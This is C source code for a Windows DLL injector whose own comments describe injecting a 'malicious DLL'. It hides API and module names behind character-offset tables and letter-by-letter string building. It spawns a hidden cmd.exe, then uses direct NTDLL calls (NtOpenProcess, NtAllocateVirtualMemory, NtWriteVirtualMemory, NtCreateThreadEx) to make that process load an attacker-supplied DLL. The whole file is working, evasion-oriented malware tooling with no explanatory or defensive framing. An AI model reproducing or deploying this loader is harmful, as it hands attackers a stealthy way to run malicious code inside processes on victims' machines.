#include <windows.h>
#include "native.h"
#include <stdlib.h>
#include <tlhelp32.h>
#include <Dbghelp.h>
#include <wchar.h> 

/*
what this code should do?
	-its purpose is to find OR take a pid arg to inject the malicious DLL into
*/



NTSTATUS STATUS;

char *GetOriginal(int offsets[],char * ALL_ALPHANUM, int sizeof_offset){
    int size = sizeof_offset / 4;  // Calculate how many characters to retrieve
    char *empty_string = malloc((size + 1) * sizeof(char));  // Allocate memory for the string + null terminator

    if (empty_string == NULL) {
        //printf("Memory allocation failed\n");
        return NULL;
    }

    for (int i = 0; i < size; ++i) {
        char character = ALL_ALPHANUM[offsets[i]];
        empty_string[i] = character;  // Append the character to the string
		//printf("%c,",character);
	}

    empty_string[size] = '\0';  // Null-terminate the string

	return empty_string; 
}

HMODULE Get_Module(LPCWSTR Module_Name){
	HMODULE hModule;
	//printf("[+] Getting Handle to %lu\n", Module_Name);
	hModule = GetModuleHandleW(Module_Name);
	if (hModule == NULL) {
		//printf("[x] Failed to get handle to module, error: %lu\n", GetLastError());
		exit(1);
	}
	//printf("[+] Got Handle to module!\n");
	//printf("[%ls\t0x%p ]\n", Module_Name, hModule);
	return hModule;
}




HANDLE get_proc_handle(	
						CLIENT_ID CID,
						ObjectAttributes Object_Attr,
						NtOpenProcess NT_OpenProcess
						)
{	
	HANDLE hProcess;
	//printf("[NtOpenProcess] Getting Process..\n");
	STATUS = NT_OpenProcess(&hProcess,PROCESS_ALL_ACCESS,&Object_Attr,&CID);
	if (STATUS != STATUS_SUCCESS) {
		//printf("[NtOpenProcess] Failed to get handle to process, error 0x%lx\n", STATUS);
		exit(1);
	}
	//printf("[NtOpenProcess] Got Handle to process! (%p)\n",hProcess);
	return hProcess;
}

BOOL allocate_mem(	HANDLE hProcess,
					PVOID *Buffer, 
					SIZE_T dll_size,
					NtAllocateVirtualMemory NT_VirtualAlloc)
{
	//printf("[NtAllocateVirtualMemory] Allocating [RW-] memory..\n");
	STATUS=NT_VirtualAlloc(hProcess,Buffer,0,&dll_size, MEM_COMMIT | MEM_RESERVE ,PAGE_READWRITE);
	if(STATUS != STATUS_SUCCESS){
		//printf("[NtAllocateVirtualMemory] Failed to allocate memeory , error 0x%lx\n",STATUS);
		return FALSE;
	}
	//printf("[NtAllocateVirtualMemory] Memory Allocated!\n");
	return TRUE;
}



BOOL write_mem(HANDLE hProcess,
				PCSTR dll_path,
				SIZE_T dll_size,
				SIZE_T *BytesWritten,
				PVOID *Buffer,
				NtWriteVirtualMemory NT_WriteVirtualMemory)
{
	//printf("[NtWriteVirtualMemory] Writing DLL into allocated memory..\n");
	STATUS=NT_WriteVirtualMemory(hProcess,*Buffer,dll_path,dll_size,&BytesWritten);
	if(STATUS != STATUS_SUCCESS){
		//printf("[NtWriteVirtualMemory] Failed to write into memeory , error 0x%lx\n",STATUS);
		//printf("[NtWriteVirtualMemory] BytesWritten -> %lu\t DLL size -> %lu\n",BytesWritten,dll_size);
		return FALSE;
	}
	//printf("[NtWriteVirtualMemory] DLL Written!, dll size -> %lu bytes\tactually written -> %lu bytes\n",dll_size,BytesWritten);	
	return TRUE;
}


BOOL d11_magik(
				HANDLE *hThread,
				ObjectAttributes *Object_Attr,
				HANDLE *hProcess,
				PVOID *Buffer,
				FARPROC L_0_D_LIB,
				NtCreateThreadEx NT_CreateThreadEx
				)
{
	// --- START LOAD LIBRARY IN REMOTE PROCESS --- //

	//printf("[NtCreateThreadEx] Injecting DLL to Remote Process\n");
	
	STATUS=NT_CreateThreadEx(hThread,THREAD_ALL_ACCESS,Object_Attr,*hProcess,(PUSER_THREAD_START_ROUTINE)L_0_D_LIB,*Buffer,FALSE,0,0,0,NULL);
	if(STATUS != STATUS_SUCCESS){
		//printf("[NtCreateThreadEx] Failed to inject DLL , error 0x%lx\n",STATUS);
		return FALSE;
	}
	//printf("[NtCreateThreadEx] DLL injected (0x%p)..\n",hThread);	
	
	// --- END LOAD LIBRARY IN REMOTE PROCESS --- //
	return TRUE;
}

void decrypt(unsigned char *data, SIZE_T data_size, char key) {
	//printf("[+] DECRYPTING with '%c' key\n", key);
	for (int i = 0; i < data_size; i++) {
		//printf("\\x%02x", data[i] ^ key);
		data[i] = data[i] ^ key;
	}
	printf("\n");
}

int main(int argc , char **argv){
	
	// --- START GET malicious dll path --- //
	if (argc < 2){
		//printf("[x] USAGE: ./%s [dll-path]\n",argv[0]);
		return EXIT_FAILURE;
	}
	// --- END GET malicious dll path --- //
	
	// --- START INIT VARS ---//
	
	
	PCSTR dll_path = argv[1];
	
	
	HANDLE hThread;
	HANDLE hProcess;
	DWORD OldProtect_MEM = 0;
	DWORD OldProtect_THREAD = 0;
	SIZE_T BytesWritten = 0;
	PVOID Buffer = NULL;
	SIZE_T dll_size = strlen(dll_path) + 1;
	char ALL_ALPHANUM[]="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._";

	//HMODULE hNTDLL = Get_Module(L"NTDLL");
	wchar_t full_string_mod_1[100];	// L"Kernel32"
	wchar_t part_mod_1_1[] = L"K";
	wchar_t part_mod_1_2[] = L"e";
	wchar_t part_mod_1_3[] = L"r";
	wchar_t part_mod_1_4[] = L"n";
	wchar_t part_mod_1_5[] = L"e";
	wchar_t part_mod_1_6[] = L"l";
	wchar_t part_mod_1_7[] = L"3";
	wchar_t part_mod_1_8[] = L"2";
	//printf("size of /shellcode.bin -> %d\n",sizeof(L"shellcode.bin"));
	wcscpy(full_string_mod_1, part_mod_1_1);
	wcscat(full_string_mod_1, part_mod_1_2);
	wcscat(full_string_mod_1, part_mod_1_3);
	wcscat(full_string_mod_1, part_mod_1_4);
	wcscat(full_string_mod_1, part_mod_1_5);
	wcscat(full_string_mod_1, part_mod_1_6);
	wcscat(full_string_mod_1, part_mod_1_7);
	wcscat(full_string_mod_1, part_mod_1_8);

	
	HMODULE hK32 = Get_Module(full_string_mod_1);
	// --- END INIT VARS ---//
	
	// --- START INIT STRUCTS ---//

	// --- END INIT STRUCTS --- //
	
	// --- START OFFSETS --- //
	int dll_k_er_32_offset[] = {10,4,17,13,4,11,55,54,62,3,11,11};
	int dll_n__t_offset[] = {39,45,29,37,37};
	int lib_load_offset[] = {37,14,0,3,37,8,1,17,0,17,24,26};
	int create_snap_offset[] = {28,17,4,0,19,4,45,14,14,11,7,4,11,15,55,54,44,13,0,15,18,7,14,19};
	int proc_first_offset[] = {41,17,14,2,4,18,18,55,54,31,8,17,18,19};
	int proc_next_offset[] = {41,17,14,2,4,18,18,55,54,39,4,23,19};
	int mutex_create_offset[] = {28,17,4,0,19,4,38,20,19,4,23,26};
	int cr_proc_offset[] = {28,17,4,0,19,4,41,17,14,2,4,18,18,26};
	int nt_open_proc_offset[] = {39,19,40,15,4,13,41,17,14,2,4,18,18};
	int nt_cr_thrd_ex_offset[] = {39,19,28,17,4,0,19,4,45,7,17,4,0,3,30,23};
	int nt_close_offset[] = {39,19,28,11,14,18,4};
	int nt_alloc_mem_offset[] = {39,19,26,11,11,14,2,0,19,4,47,8,17,19,20,0,11,38,4,12,14,17,24};
	int nt_wr_mem_offset[] = {39,19,48,17,8,19,4,47,8,17,19,20,0,11,38,4,12,14,17,24};
	int nt_prtct_mem_offset[] = {39,19,41,17,14,19,4,2,19,47,8,17,19,20,0,11,38,4,12,14,17,24};
	int nt_wt_fr_single_obj_offset[] = {39,19,48,0,8,19,31,14,17,44,8,13,6,11,4,40,1,9,4,2,19};
	int nt_free_mem_offset[] = {39,19,31,17,4,4,47,8,17,19,20,0,11,38,4,12,14,17,24};
	// --- END OFFSETS --- //
	
	// --- START GET LoadLibraryA function ---//
	FARPROC L_0_D_LIB = GetProcAddress(hK32,GetOriginal(lib_load_offset,ALL_ALPHANUM,sizeof(lib_load_offset)));
	// --- END GET LoadLibraryA function ---//


	// --- START LOAD KERNEL32 DLL --- //
	HMODULE hDLL_k_er_32 = L_0_D_LIB(GetOriginal(dll_k_er_32_offset,ALL_ALPHANUM,sizeof(dll_k_er_32_offset)));
	if (hDLL_k_er_32 == NULL){
		//printf("[x] COULD NOT LOAD kernel32.dll, err -> %lu\n",GetLastError());
		exit(1);
	}
	// --- END LOAD KERNEL32 DLL ---//
	
	// --- START LOAD NTDLL DLL --- //
	HMODULE hDLL_n__t = L_0_D_LIB(GetOriginal(dll_n__t_offset,ALL_ALPHANUM,sizeof(dll_n__t_offset)));
	if (hDLL_k_er_32 == NULL){
		//printf("[x] COULD NOT LOAD ntdll.dll, err -> %lu\n",GetLastError());
		exit(1);
	}
	// --- END LOAD NTDLL DLL ---//
	
	
	// --- START FUNCTION PROTOTYPES INIT --- //
	//printf("[+] getting prototypes ready...\n");
	
	NtOpenProcess NT_OpenProcess = (NtOpenProcess)GetProcAddress(hDLL_n__t, GetOriginal(nt_open_proc_offset,ALL_ALPHANUM,sizeof(nt_open_proc_offset))); 
	NtCreateThreadEx NT_CreateThreadEx = (NtCreateThreadEx)GetProcAddress(hDLL_n__t, GetOriginal(nt_cr_thrd_ex_offset,ALL_ALPHANUM,sizeof(nt_cr_thrd_ex_offset))); 
	NtClose NT_Close = (NtClose)GetProcAddress(hDLL_n__t, GetOriginal(nt_close_offset,ALL_ALPHANUM,sizeof(nt_close_offset)));
	NtAllocateVirtualMemory NT_VirtualAlloc = (NtAllocateVirtualMemory)GetProcAddress(hDLL_n__t,GetOriginal(nt_alloc_mem_offset,ALL_ALPHANUM,sizeof(nt_alloc_mem_offset)));	
	NtWriteVirtualMemory NT_WriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hDLL_n__t,GetOriginal(nt_wr_mem_offset,ALL_ALPHANUM,sizeof(nt_wr_mem_offset)));		
	NtProtectVirtualMemory NT_ProtectVirtualMemory = (NtProtectVirtualMemory)GetProcAddress(hDLL_n__t,GetOriginal(nt_prtct_mem_offset,ALL_ALPHANUM,sizeof(nt_prtct_mem_offset)));	
	NtWaitForSingleObject NT_WaitForSingleObject = (NtWaitForSingleObject)GetProcAddress(hDLL_n__t,GetOriginal(nt_wt_fr_single_obj_offset,ALL_ALPHANUM,sizeof(nt_wt_fr_single_obj_offset)));
	NtFreeVirtualMemory NT_FreeVirtualMemory = (NtFreeVirtualMemory)GetProcAddress(hDLL_n__t,GetOriginal(nt_free_mem_offset,ALL_ALPHANUM,sizeof(nt_free_mem_offset)));
	//NtCreateProcessEx NT_CreateProcessEx = (NtCreateProcessEx)GetProcAddress(hDLL_n__t,"NtCreateProcessEx");
	//NtOpenMutant NT_OpenMutant = (NtOpenMutant)GetProcAddress(hDLL_n__t,full_func_2);
	//NtCreateMutant NT_CreateMutant = (NtCreateMutant)GetProcAddress(hDLL_n__t,full_func_3);
	//FARPROC create_snap_func = GetProcAddress(hDLL_k_er_32,GetOriginal(create_snap_offset,ALL_ALPHANUM,sizeof(create_snap_offset)));
	//FARPROC proc_first_func = GetProcAddress(hDLL_k_er_32,GetOriginal(proc_first_offset,ALL_ALPHANUM,sizeof(proc_first_offset)));
	//FARPROC proc_next_func = GetProcAddress(hDLL_k_er_32,GetOriginal(proc_next_offset,ALL_ALPHANUM,sizeof(proc_next_offset)));
	//FARPROC mutex_create_func =  GetProcAddress(hDLL_k_er_32,GetOriginal(mutex_create_offset,ALL_ALPHANUM,sizeof(mutex_create_offset)));
	FARPROC cr_proc_func = GetProcAddress(hDLL_k_er_32,GetOriginal(cr_proc_offset,ALL_ALPHANUM,sizeof(cr_proc_offset)));
	
	//printf("[+] prototypes are ready...\n");
	// --- END FUNCTION PROTOTYPES INIT --- //
	

	
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    // Initialize the STARTUPINFO structure
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si); // Set size of the structure

    // Initialize the PROCESS_INFORMATION structure
    ZeroMemory(&pi, sizeof(pi));

	char full_string_1[10];	// cmd.exe
	char part_string_1_1[] = "c";
	char part_string_1_2[] = "m";
	char part_string_1_3[] = "d";
	char part_string_1_4[] = ".";
	char part_string_1_5[] = "e";
	char part_string_1_6[] = "x";
	char part_string_1_7[] = "e";
	strcpy(full_string_1, part_string_1_1);
	strcat(full_string_1, part_string_1_2);
	strcat(full_string_1, part_string_1_3);
	strcat(full_string_1, part_string_1_4);
	strcat(full_string_1, part_string_1_5);
	strcat(full_string_1, part_string_1_6);
	strcat(full_string_1, part_string_1_7);
	//printf("%s\n",full_string_1);


    // Launch cmd.exe using CreateProcessA
    if (cr_proc_func(
            NULL,                // Application name (NULL means use the command line)
            full_string_1,       // Command line (the program to execute)
            NULL,                // Process security attributes
            NULL,                // Thread security attributes
            FALSE,               // Inherit handles (false means no)
            CREATE_NO_WINDOW,                   // Creation flags (set to 0 for default behavior) //CREATE_NO_WINDOW
            NULL,                // Environment (NULL uses the current environment)
            NULL,                // Current directory (NULL uses current directory)
            &si,                 // Pointer to STARTUPINFOA
            &pi                  // Pointer to PROCESS_INFORMATION
        ) == 0) {
        // If CreateProcessA fails
        //printf("CreateProcess failed with error code: %lu\n", GetLastError());
        return 1;
    }
    // Successfully created the process
    //printf("Process created successfully. PID: %lu\n", pi.dwProcessId);
	
	
	CLIENT_ID CID;
    CID.UniqueProcess = (HANDLE)(ULONG_PTR)pi.dwProcessId;
    CID.UniqueThread = 0;

	ObjectAttributes Object_Attr;
	ZeroMemory(&Object_Attr, sizeof(ObjectAttributes));
	Object_Attr.Length = sizeof(ObjectAttributes);

	
	hProcess = get_proc_handle(CID,Object_Attr,NT_OpenProcess);
		
	
    if ( !allocate_mem(hProcess,&Buffer,dll_size,NT_VirtualAlloc) ){
		goto CLEANUP;
	}
	
	
	if ( !write_mem(hProcess,dll_path,dll_size,&BytesWritten,&Buffer,NT_WriteVirtualMemory) ){	
		goto CLEANUP;
	}
	
	if (! d11_magik(&hThread, &Object_Attr,&hProcess,&Buffer,L_0_D_LIB,NT_CreateThreadEx) ){
		goto CLEANUP;
	}
	
	
	// --- START WAIT --- //
	//printf("[0x%p] Waiting to Finish Execution\n",hThread);
	STATUS=NT_WaitForSingleObject(hThread,FALSE,NULL);
	//printf("[NtWaitForSingleObject] Thread (0x%p) Finished! Beginning Cleanup\n",hThread);
	// --- END WAIT --- //
	
	
	
	
CLEANUP:
	if (Buffer){
		STATUS=NT_FreeVirtualMemory(hProcess,&Buffer,&dll_size,MEM_DECOMMIT);
		if (STATUS_SUCCESS != STATUS) {
            //printf("[NtClose] Failed to decommit allocated buffer, error 0x%lx\n", STATUS);
        }
		//printf("[NtClose] decommitted allocated buffer (0x%p) from process memory\n", Buffer);
	}
	if(hThread){
		//printf("[NtClose] Closing hThread handle\n");
		NT_Close(hThread);
	}
	if(hProcess){
		//printf("[NtClose] Closing hProcess handle\n");
		NT_Close(hProcess);
	}
	/*
	if(hMutex){
		//printf("[NtClose] Closing hMutex handle\n");
		NT_Close(hMutex);
	}
	*/
	
	return EXIT_SUCCESS;
}
